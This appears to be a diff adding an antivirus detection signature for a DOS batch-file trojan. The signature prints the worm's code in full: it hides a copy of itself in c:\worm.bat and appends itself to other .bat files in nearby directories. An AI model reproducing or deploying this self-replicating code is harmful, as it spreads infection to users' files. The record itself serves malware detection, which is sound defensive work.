@@ -1,0 +1,5 @@
+VIRUS NAME: Dos.Trojan.Agent-36713
+TARGET TYPE: NORMALIZED ASCII TEXT
+OFFSET: 0
+DECODED SIGNATURE:
+@echo off%[worm]% if '%1=='in_ goto wormin if exist c:\worm.bat goto wormru if not exist %0 goto wormen find "worm"<%0>c:\worm.bat attrib +h c:\worm.bat :wormru for %%g in (..\..\*.* ..\*.* *.*) do call c:\worm in_ %%g goto wormen :wormin if exist %2.bat goto wormen type c:\worm.bat>>%2.bat echo start %2>>%2.bat%[worm]% :wormen
